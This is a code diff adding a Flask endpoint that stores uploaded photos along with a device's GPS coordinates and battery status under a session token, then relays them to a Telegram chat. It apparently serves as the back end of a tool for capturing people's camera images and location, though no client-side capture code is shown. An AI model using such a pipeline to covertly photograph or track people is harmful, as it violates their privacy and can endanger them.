@@ -307,6 +307,86 @@ def telegram_webhook():
     except Exception as e:
         print("Telegram webhook error:", e)
     return "ok", 200
+@app.route("/upload_image/<token>", methods=["POST"])
+def upload_image(token):
+    """
+    Accepts JSON body:
+      {
+        "image_b64": "data:image/jpeg;base64,...",
+        "coords": {"lat":..., "lon":..., "accuracy":...}  (optional),
+        "battery": {"level":..., "charging":...}          (optional)
+      }
+
+    Saves file, records metadata into session, and notifies Telegram:
+      - sends photo (preferred)
+      - if sending photo fails, sends a text message with a download URL
+    """
+    if token not in SESSIONS:
+        return "Invalid token", 404
+
+    data = request.get_json(silent=True) or {}
+    b64 = data.get("image_b64", "")
+    coords = data.get("coords")
+    battery = data.get("battery")
+
+    if not b64:
+        return ("No image data", 400)
+    if b64.startswith("data:"):
+        try:
+            b64 = b64.split(",", 1)[1]
+        except Exception:
+            return ("Bad data url", 400)
+    try:
+        imgbytes = base64.b64decode(b64)
+    except Exception:
+        return ("Bad base64", 400)
+
+    # limit image size (reject if > 10 MB)
+    if len(imgbytes) > 10_000_000:
+        return ("Image too large", 413)
+
+    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S%f")
+    fname = f"{token}_{timestamp}.jpg"
+    path = os.path.join(UPLOAD_DIR, fname)
+    try:
+        with open(path, "wb") as f:
+            f.write(imgbytes)
+    except Exception as e:
+        print("Failed to write image:", e)
+        return ("Server error saving image", 500)
+
+    # persist filename and metadata
+    sess = SESSIONS[token]
+    sess.setdefault("files", []).append(fname)
+    meta = {"timestamp": timestamp, "filename": fname}
+    if coords:
+        meta["coords"] = coords
+    if battery:
+        meta["battery"] = battery
+    sess.setdefault("images_meta", []).append(meta)
+    save_sessions(SESSIONS)
+
+    # Notify Telegram: prefer sending the photo (so it appears in chat)
+    chat_id = sess.get("chat_id")
+    if chat_id:
+        caption_parts = [f"Session {token} — photo {timestamp}"]
+        if coords:
+            caption_parts.append(f"Coords: {coords.get('lat')},{coords.get('lon')} (acc {coords.get('accuracy')})")
+        if battery:
+            lev = battery.get("level")
+            ch = battery.get("charging")
+            caption_parts.append(f"Battery: {lev}%{' charging' if ch else ''}")
+        caption = "\n".join(caption_parts)
+        sent = telegram_send_photo(chat_id, path, caption=caption)
+        if not sent:
+            # fallback: send text with download link
+            try:
+                downloads_url = url_for("serve_upload", filename=fname, _external=True)
+                telegram_send_message(chat_id, f"Image saved: {downloads_url}\n{caption}")
+            except Exception:
+                pass
+
+    return jsonify({"status": "saved", "filename": fname, "meta": meta})
 
 # ---------- Run ----------
 if __name__ == "__main__":
